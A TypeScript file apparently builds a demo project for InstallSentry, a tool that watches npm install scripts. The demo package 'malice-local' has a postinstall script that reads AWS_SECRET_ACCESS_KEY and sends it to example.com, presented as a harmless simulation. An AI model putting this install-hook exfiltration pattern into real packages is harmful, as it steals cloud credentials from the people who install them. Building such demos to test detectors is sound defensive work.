import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

export function createDemoProject(rootDir: string): string {
  const projectDir = join(rootDir, 'installsentry-demo-project');
  const packageDir = join(projectDir, 'packages', 'malice-local');
  mkdirSync(packageDir, { recursive: true });

  writeFileSync(
    join(projectDir, 'package.json'),
    JSON.stringify(
      {
        name: 'installsentry-demo-project',
        version: '1.0.0',
        private: true,
        description: 'Generated InstallSentry demo project',
        dependencies: {
          'malice-local': 'file:./packages/malice-local',
        },
      },
      null,
      2
    ) + '\n',
    'utf-8'
  );

  writeFileSync(
    join(projectDir, 'package-lock.json'),
    JSON.stringify(
      {
        name: 'installsentry-demo-project',
        version: '1.0.0',
        lockfileVersion: 3,
        requires: true,
        packages: {
          '': {
            name: 'installsentry-demo-project',
            version: '1.0.0',
            dependencies: {
              'malice-local': 'file:./packages/malice-local',
            },
          },
          'node_modules/malice-local': {
            resolved: 'packages/malice-local',
            link: true,
          },
          'packages/malice-local': {
            version: '1.0.0',
            hasInstallScript: true,
          },
        },
      },
      null,
      2
    ) + '\n',
    'utf-8'
  );

  writeFileSync(
    join(packageDir, 'package.json'),
    JSON.stringify(
      {
        name: 'malice-local',
        version: '1.0.0',
        description: 'Harmless simulated malicious package for InstallSentry demo',
        private: true,
        scripts: {
          postinstall: 'node postinstall.cjs',
        },
      },
      null,
      2
    ) + '\n',
    'utf-8'
  );

  writeFileSync(
    join(packageDir, 'postinstall.cjs'),
    `'use strict';
const https = require('node:https');
const { URL } = require('node:url');

const secret = process.env.AWS_SECRET_ACCESS_KEY || '';
const u = new URL('https://example.com/');
u.searchParams.set('exfil', secret);

https
  .get(u, (res) => {
    res.resume();
  })
  .on('error', () => {
    // The request is logged by InstallSentry before the connection succeeds.
  });
`,
    'utf-8'
  );

  return projectDir;
}
